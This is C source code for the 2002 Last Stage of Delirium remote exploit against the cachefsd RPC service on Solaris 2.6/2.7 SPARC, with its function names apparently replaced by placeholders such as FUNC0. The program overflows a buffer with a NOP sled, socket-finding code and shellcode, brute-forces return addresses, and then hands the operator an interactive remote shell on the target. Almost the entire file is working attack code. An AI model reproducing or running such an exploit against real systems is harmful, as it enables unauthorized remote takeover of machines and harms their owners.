#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_10__   TYPE_3__ ;
typedef  struct TYPE_9__   TYPE_2__ ;
typedef  struct TYPE_8__   TYPE_1__ ;

/* Type definitions */
struct timeval {int member_0; int tv_sec; int /*<<< orphan*/  member_1; } ;
struct TYPE_8__ {int s_addr; } ;
struct sockaddr_in {int /*<<< orphan*/  sin_port; TYPE_1__ sin_addr; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {int /*<<< orphan*/ * h_addr; } ;
struct TYPE_9__ {char* dir; char* cache; } ;
typedef  TYPE_2__ req_t ;
typedef  int /*<<< orphan*/  fd_set ;
typedef  enum clnt_stat { ____Placeholder_clnt_stat } clnt_stat ;
struct TYPE_10__ {int /*<<< orphan*/  cl_auth; } ;
typedef  TYPE_3__ CLIENT ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  CACHEFS_MOUNTED ; 
 int /*<<< orphan*/  CACHEFS_PROG ; 
 int /*<<< orphan*/  CACHEFS_VERS ; 
 scalar_t__ EADDRNOTAVAIL ; 
 scalar_t__ EAGAIN ; 
 scalar_t__ EWOULDBLOCK ; 
 scalar_t__ FUNC0 (int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC1 (int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FD_SETSIZE ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ *) ; 
 int NOPNUM ; 
 int RPC_ANYSOCK ; 
 int RPC_CANTRECV ; 
 int RPC_SUCCESS ; 
 int FUNC3 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC4 (char*,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int FUNC5 (TYPE_3__*,int /*<<< orphan*/ ,int /*<<< orphan*/ ,void*,int /*<<< orphan*/ ,int /*<<< orphan*/ *,struct timeval) ; 
 int /*<<< orphan*/  FUNC6 (TYPE_3__*) ; 
 int /*<<< orphan*/  FUNC7 (char*) ; 
 int /*<<< orphan*/  FUNC8 (TYPE_3__*,char*) ; 
 TYPE_3__* FUNC9 (struct sockaddr_in*,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int*,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC10 (int) ; 
 scalar_t__ errno ; 
 int /*<<< orphan*/  FUNC11 (int) ; 
 int /*<<< orphan*/  FUNC12 (int /*<<< orphan*/ ) ; 
 void** findsckcode ; 
 struct hostent* FUNC13 (char*) ; 
 int FUNC14 (int,char**,char*) ; 
 int FUNC15 (int,struct sockaddr*,int*) ; 
 int /*<<< orphan*/  FUNC16 (int) ; 
 int /*<<< orphan*/  FUNC17 (int) ; 
 int FUNC18 (char*) ; 
 int /*<<< orphan*/  FUNC19 (int,char,...) ; 
 int /*<<< orphan*/  FUNC20 (char*,int /*<<< orphan*/ *,int) ; 
 int /*<<< orphan*/  FUNC21 (char*,int,int) ; 
 int /*<<< orphan*/ * nop ; 
 int FUNC22 (int /*<<< orphan*/ ) ; 
 int FUNC23 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  optarg ; 
 int /*<<< orphan*/  FUNC24 (char*) ; 
 int /*<<< orphan*/  FUNC25 (char*,...) ; 
 int FUNC26 (int,char*,int) ; 
 scalar_t__ FUNC27 (int /*<<< orphan*/ ,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *) ; 
 void** shellcode ; 
 int /*<<< orphan*/  stdout ; 
 int FUNC28 (void**) ; 
 int /*<<< orphan*/ * tab ; 
 int /*<<< orphan*/  FUNC29 (int,char*,int) ; 
 int /*<<< orphan*/  xdr_req ; 
 int /*<<< orphan*/  xdr_void ; 

FUNC30(int argc,char **argv){
    char buffer[100000],*b;
    int i,j,c,n,address,offset=0,ofs=0,port=0,sck,flag=0,mflag=0,vers=-1;
    CLIENT *cl;enum clnt_stat stat;
    struct hostent *hp;
    struct sockaddr_in adr;
    struct timeval tm={10,0};
    req_t req;

    FUNC25("copyright LAST STAGE OF DELIRIUM jan 2002 poland  //lsd-pl.net/\n");
    FUNC25("cachefsd for solaris 2.6 2.7 sparc\n\n");

    if(argc<2){
        FUNC25("usage: %s address [-p port] [-o ofs] -v 6|7 [-b] [-m]\n",argv[0]);
        FUNC11(-1);
    }

    while((c=FUNC14(argc-1,&argv[1],"p:o:v:bm"))!=-1){
        switch(c){
        case 'p': port=FUNC3(optarg);break;
        case 'o': offset=FUNC3(optarg);break;
        case 'v': vers=FUNC3(optarg);break;
        case 'b': flag=1;break;
	case 'm': mflag=1;
        }
    }

    switch(vers){
    case 6: address=0xefffeb20;break;
    case 7: case 8: address=0xffbee998;break;
    default: FUNC11(-1);
    }
    if(mflag) address=0xeffffa1c;
    for(j=0;j<512;j++){
        tab[0]=tab[1]=FUNC16(0xfffffffe);
        tab[3]=FUNC16(address+offset+ofs+((flag)?80:0));
        tab[9]=FUNC16(address+offset+ofs+((mflag)?-4136:4228));

        if(!j){
            FUNC25("ret=0x%08x adr=0x%08x ofs=%d timeout=%d\n",
	        FUNC22(tab[9]),FUNC22(tab[3]),offset,
	        tm.tv_sec);
        }

        adr.sin_family=AF_INET;
        adr.sin_port=FUNC17(port);
        if((adr.sin_addr.s_addr=FUNC18(argv[1]))==-1){
            if((hp=FUNC13(argv[1]))==NULL){
	        errno=EADDRNOTAVAIL;FUNC24("\nerror");FUNC11(-1);
            }
            FUNC20(&adr.sin_addr.s_addr,hp->h_addr,4);
        }
  
        sck=RPC_ANYSOCK;
        if(!(cl=FUNC9(&adr,CACHEFS_PROG,CACHEFS_VERS,&sck,0,0))){
            FUNC7("\nclnttcp_create error");FUNC11(-1);
        }
        cl->cl_auth=FUNC4("localhost",0,0,0,NULL);

        FUNC21(buffer,0xff,60000);
        buffer[60000]=0;

        req.dir=buffer;
        req.cache="lsd";

        stat=FUNC5(cl,CACHEFS_MOUNTED,xdr_req,(void*)&req,xdr_void,NULL,tm);
        if(stat!=RPC_SUCCESS) {FUNC8(cl,"\nerror");FUNC11(-1);}

        i=sizeof(struct sockaddr_in);
        if(FUNC15(sck,(struct sockaddr*)&adr,&i)==-1){
            struct{unsigned int maxlen;unsigned int len;char *buf;}nb;
            FUNC19(sck,(('S'<<8)|2),"sockmod");
            nb.maxlen=0xffff;
            nb.len=sizeof(struct sockaddr_in);
            nb.buf=(char*)&adr;
            FUNC19(sck,(('T'<<8)|144),&nb);
        }
        n=FUNC23(adr.sin_port);

        findsckcode[14+0]=(unsigned char)((n>>8)&0xff);
        findsckcode[14+1]=(unsigned char)(n&0xff);

        FUNC21(buffer,0x41,14000);
        b=buffer; 
        for(i=0;i<NOPNUM;i++) *b++=nop[i%4];
        for(i=0;i<FUNC28(findsckcode);i++) *b++=findsckcode[i];
        for(i=0;i<FUNC28(shellcode);i++) *b++=shellcode[i];
        FUNC20(&buffer[13920],tab,40);
        buffer[14000]=0;

        req.dir="/var/lp";
        req.cache=buffer;
        stat=FUNC5(cl,CACHEFS_MOUNTED,xdr_req,(void*)&req,xdr_void,NULL,tm);
        if(stat!=RPC_SUCCESS) {FUNC8(cl,"\nerror");FUNC11(-1);}
        stat=FUNC5(cl,CACHEFS_MOUNTED,xdr_req,(void*)&req,xdr_void,NULL,tm);
        if((stat==RPC_SUCCESS)||(stat==RPC_CANTRECV)){
            FUNC6(cl);FUNC10(sck);
            ofs=(j%2)?(-((j>>1)+1)*4):(((j>>1)+1)*4);
	    FUNC25(".");FUNC12(stdout);
        }else break;
    }

    FUNC25("OK! adr=0x%08x\n",FUNC22(tab[3]));
    FUNC29(sck,"/bin/uname -a\n",14);
    while(1){
        fd_set fds;
        FUNC2(&fds);
        FUNC1(0,&fds);
        FUNC1(sck,&fds);
        if(FUNC27(FD_SETSIZE,&fds,NULL,NULL,NULL)){
	    int cnt;
	    char buf[1024];
	    if(FUNC0(0,&fds)){
                if((cnt=FUNC26(0,buf,1024))<1){
	            if(errno==EWOULDBLOCK||errno==EAGAIN) continue;
	            else break;
                }
	        FUNC29(sck,buf,cnt);
            }
            if(FUNC0(sck,&fds)){
                if((cnt=FUNC26(sck,buf,1024))<1){
	            if(errno==EWOULDBLOCK||errno==EAGAIN) continue;
	            else break;
                }
                FUNC29(1,buf,cnt);
            }
        }
    }
}